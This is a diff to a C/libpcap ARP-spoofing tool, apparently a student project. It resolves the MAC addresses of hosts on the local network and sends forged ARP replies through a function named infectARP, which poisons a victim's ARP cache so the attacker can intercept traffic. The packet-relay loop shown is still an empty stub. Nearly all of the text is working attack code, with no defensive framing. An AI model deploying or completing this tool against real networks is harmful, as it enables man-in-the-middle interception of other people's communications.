@@ -6,7 +6,13 @@ int main(int argc, char *argv[]){
 	int i;
 	pcap_t *handle;
     char errbuf[PCAP_ERRBUF_SIZE];
-    struct threadArgs *args;
+    struct spoofArgs *head = NULL;
+    struct spoofArgs *newArg, *tmpArg;
+    struct in_addr myIP;
+    struct macAddr myMAC;
+    struct pcap_pkthdr *header;
+    const u_char *rcvdPacket;
+    int result;
 
 	if( argc < 4 ){
 		usage( argv[0] );
@@ -19,26 +25,48 @@ int main(int argc, char *argv[]){
         return -1;
     }
 
+    resolveMyMAC( &myMAC, interface );
+    resolveMyIP( &myIP, interface );
+
 	for( i = 2; i + 1 < argc; i += 2 ){
 		senderIP = argv[i];
 		targetIP = argv[i+1];
-		args = (struct threadArgs*)malloc(sizeof(struct threadArgs));
 
-		args->handle = handle;
-		if( inet_pton( AF_INET, senderIP, &(args->senderIP) ) != 1 ){
-	        fprintf(stderr, "Invalid IP : %s\n", senderIP);
-	        continue;
-	    }
-	    if( inet_pton( AF_INET, targetIP, &(args->targetIP) ) != 1 ){
-	        fprintf(stderr, "Invalid IP : %s\n", targetIP);
-	        continue;
-	    }
+		newArg = (struct spoofArgs*)malloc(sizeof(struct spoofArgs));
+
+		newArg->handle = handle;
+		if( inet_pton(AF_INET, senderIP, &(newArg->senderIP) ) != 1 ){
+			fprintf( stderr, "Invalid IP : %s\n", senderIP);
+			continue;
+		}
+
+		if( inet_pton(AF_INET, targetIP, &(newArg->targetIP) ) != 1 ){
+			fprintf( stderr, "Invalid IP : %s\n", targetIP);
+			continue;
+		}
+
+		memcpy(&(newArg->myIP), &myIP, sizeof(struct in_addr));
+		memcpy(&(newArg->myMAC), &myMAC, sizeof(struct macAddr));
+
+		resolveMAC( &(newArg->senderMAC), &(newArg->myMAC), &(newArg->senderIP), &(newArg->myIP), handle );
+		resolveMAC( &(newArg->targetMAC), &(newArg->myMAC), &(newArg->targetIP), &(newArg->myIP), handle );
+
+		infectARP( &(newArg->senderMAC), &(newArg->senderIP), &(newArg->myMAC), &(newArg->targetIP), handle );
+
+		for( tmpArg = head; tmpArg != NULL && tmpArg->next != NULL; tmpArg = tmpArg->next);
+
+		if( tmpArg == NULL ){
+			head = newArg;
+		}
+		else{
+			tmpArg->next = newArg;
+		}
 	}
 
-}
+	while(1){
+		result = pcap_next_ex( handle, &header, &rcvdPacket );
 
-void arp_spoof(void *args){
-
+	}
 }
 
 
@@ -50,30 +78,30 @@ int infectARP( struct macAddr *senderMAC, struct in_addr *senderIP, struct macAd
     uint32_t packetSize;
     struct pcap_pkthdr *header;
 
-    memcpy( etherHDR.ether_dhost, senderMAC, ETHER_ADDR_LEN );
-    memcpy( etherHDR.ether_shost, myMAC, ETHER_ADDR_LEN );
+    memcpy( etherHDR.ether_dhost, senderMAC, sizeof(struct macAddr) );
+    memcpy( etherHDR.ether_shost, myMAC, sizeof(struct macAddr) );
     etherHDR.ether_type = htons(ETHERTYPE_ARP);
 
     arpHDR.ar_hrd = htons(ARPHRD_ETHER);
     arpHDR.ar_pro = htons(ETHERTYPE_IP);
-    arpHDR.ar_hln = ETHER_ADDR_LEN;
-    arpHDR.ar_pln = INET_ADDRLEN;
+    arpHDR.ar_hln = sizeof(struct macAddr);
+    arpHDR.ar_pln = sizeof(struct in_addr);
     arpHDR.ar_op  = htons(ARPOP_REPLY);
 
-    packetSize = sizeof(etherHDR) + sizeof(arpHDR) + 2 * ETHER_ADDR_LEN + 2 * INET_ADDRLEN;
+    packetSize = sizeof(etherHDR) + sizeof(arpHDR) + 2 * sizeof(struct macAddr) + 2 * sizeof(struct in_addr);
     packet = (uint8_t*)malloc( packetSize );
 
-    memcpy( packet + offset, &etherHDR, ETHER_ADDR_LEN );
+    memcpy( packet + offset, &etherHDR, sizeof(struct ether_header) );
     offset += sizeof(etherHDR);
     memcpy( packet + offset, &arpHDR, sizeof(arpHDR) );
     offset += sizeof(arpHDR);
-    memcpy( packet + offset, myMAC, ETHER_ADDR_LEN );
+    memcpy( packet + offset, myMAC, sizeof(struct macAddr) );
     offset += sizeof(struct macAddr);
-    memcpy( packet + offset, gatewayIP, INET_ADDRLEN );
+    memcpy( packet + offset, gatewayIP, sizeof(struct in_addr) );
     offset += sizeof(struct in_addr);
-    memcpy( packet + offset, senderMAC, ETHER_ADDR_LEN );
+    memcpy( packet + offset, senderMAC, sizeof(struct macAddr) );
     offset += sizeof(struct macAddr);
-    memcpy( packet + offset, senderIP, INET_ADDRLEN );
+    memcpy( packet + offset, senderIP, sizeof(struct in_addr) );
 
     if( pcap_sendpacket( handle, packet, packetSize ) ){
         exit(1);
@@ -121,7 +149,7 @@ struct macAddr *resolveMyMAC( struct macAddr *myMAC, char *interface ){
     sdl = (struct sockaddr_dl *)(ifm + 1);
     ptr = (unsigned char *)LLADDR(sdl);
 
-    memcpy( myMAC, ptr, ETHER_ADDR_LEN );
+    memcpy( myMAC, ptr, sizeof(struct macAddr) );
     return myMAC;
 #endif
 #ifndef MACOSX // Ref : https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program
@@ -130,7 +158,7 @@ struct macAddr *resolveMyMAC( struct macAddr *myMAC, char *interface ){
 
     strcpy(s.ifr_name, interface);
     if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
-        memcpy( &myMAC, s.ifr_addr.sa_data, ETHER_ADDR_LEN );
+        memcpy( &myMAC, s.ifr_addr.sa_data, sizeof(struct macAddr) );
     }
     else{
         exit(1);
@@ -180,7 +208,7 @@ struct in_addr *resolveMyIP(struct in_addr *myIP, char *interface) // Ref : http
 }
 
 
-struct macAddr *resolveSenderMAC( struct macAddr *senderMAC, struct macAddr *myMAC, struct in_addr *senderIP, struct in_addr *myIP, pcap_t *handle ){
+struct macAddr *resolveMAC( struct macAddr *senderMAC, struct macAddr *myMAC, struct in_addr *senderIP, struct in_addr *myIP, pcap_t *handle ){
     struct ether_header etherHDR, *retherHDR;
     struct arphdr       arpHDR, *rarpHDR;
     struct in_addr *rsenderIP;
@@ -191,38 +219,40 @@ struct macAddr *resolveSenderMAC( struct macAddr *senderMAC, struct macAddr *myM
     struct pcap_pkthdr *header;
     const u_char *rcvdPacket;
     int result;
+    int i;
 
-    memcpy( etherHDR.ether_dhost, "\xFF\xFF\xFF\xFF\xFF\xFF", ETHER_ADDR_LEN );
-    memcpy( etherHDR.ether_shost, myMAC, ETHER_ADDR_LEN );
+    memcpy( &(etherHDR.ether_dhost), "\xFF\xFF\xFF\xFF\xFF\xFF", sizeof(struct macAddr) );
+    memcpy( &(etherHDR.ether_shost), myMAC, sizeof(struct macAddr) );
     etherHDR.ether_type = htons(ETHERTYPE_ARP);
 
     arpHDR.ar_hrd = htons(ARPHRD_ETHER);
     arpHDR.ar_pro = htons(ETHERTYPE_IP);
-    arpHDR.ar_hln = ETHER_ADDR_LEN;
-    arpHDR.ar_pln = INET_ADDRLEN;
+    arpHDR.ar_hln = sizeof(struct macAddr);
+    arpHDR.ar_pln = sizeof(struct in_addr);
     arpHDR.ar_op  = htons(ARPOP_REQUEST);
 
-    packetSize = sizeof(etherHDR) + sizeof(arpHDR) + 2 * ETHER_ADDR_LEN + 2 * INET_ADDRLEN;
+    packetSize = sizeof(etherHDR) + sizeof(arpHDR) + 2 * sizeof(struct macAddr) + 2 * sizeof(struct in_addr);
     packet = (uint8_t *)malloc( packetSize );
 
-    memcpy( packet + offset, &etherHDR, ETHER_ADDR_LEN );
+    memcpy( packet + offset, &etherHDR, sizeof(struct ether_header) );
     offset += sizeof(etherHDR);
     memcpy( packet + offset, &arpHDR, sizeof(arpHDR) );
     offset += sizeof(arpHDR);
-    memcpy( packet + offset, myMAC, ETHER_ADDR_LEN );
+    memcpy( packet + offset, myMAC, sizeof(struct macAddr) );
     offset += sizeof(struct macAddr);
-    memcpy( packet + offset, myIP, INET_ADDRLEN );
+    memcpy( packet + offset, myIP, sizeof(struct in_addr) );
     offset += sizeof(struct in_addr);
-    memcpy( packet + offset, "\x00\x00\x00\x00\x00\x00", ETHER_ADDR_LEN );
+    memcpy( packet + offset, "\x00\x00\x00\x00\x00\x00", sizeof(struct macAddr) );
     offset += sizeof(struct macAddr);
-    memcpy( packet + offset, senderIP, INET_ADDRLEN );
+    memcpy( packet + offset, senderIP, sizeof(struct in_addr) );
+
 
     if( pcap_sendpacket( handle, packet, packetSize ) ){
         exit(1);
     }
 
     while(1){
-        result = pcap_next_ex( handle, &header, &rcvdPacket );
+    	result = pcap_next_ex( handle, &header, &rcvdPacket );
         if( result < 0 ){
             exit(1);
         }
@@ -233,28 +263,26 @@ struct macAddr *resolveSenderMAC( struct macAddr *senderMAC, struct macAddr *myM
             continue;
         }
 
-
         retherHDR = (struct ether_header *)rcvdPacket;
         if( htons(retherHDR->ether_type) != ETHERTYPE_ARP ){
             continue;
         }
 
-        rarpHDR = (struct arphdr*)((char *)retherHDR + ETHER_ADDR_LEN);
+        rarpHDR = (struct arphdr*)((char *)retherHDR + sizeof(struct ether_header));
         if( !(htons(rarpHDR->ar_hrd) == ARPHRD_ETHER &&
                     htons(rarpHDR->ar_pro) == ETHERTYPE_IP &&
-                    rarpHDR->ar_hln == ETHER_ADDR_LEN &&
-                    rarpHDR->ar_pln == INET_ADDRLEN &&
+                    rarpHDR->ar_hln == sizeof(struct macAddr) &&
+                    rarpHDR->ar_pln == sizeof(struct in_addr) &&
                     htons(rarpHDR->ar_op) == ARPOP_REPLY) ){
             continue;
         }
-
-        rsenderIP = (struct in_addr*)((char*)rarpHDR + sizeof(struct arphdr) + ETHER_ADDR_LEN );
-        if(memcmp(rsenderIP, senderIP, INET_ADDRLEN)){
+        rsenderIP = (struct in_addr*)((char*)rarpHDR + sizeof(struct arphdr) + sizeof(struct macAddr) );
+        if(memcmp(rsenderIP, senderIP, sizeof(struct in_addr))){
             continue;
         }
 
         rsenderMAC = (struct macAddr*)((char*)rarpHDR + sizeof(struct arphdr));
-        memcpy( senderMAC, rsenderMAC, ETHER_ADDR_LEN );
+        memcpy( senderMAC, rsenderMAC, sizeof(struct macAddr) );
         break;
     }
 
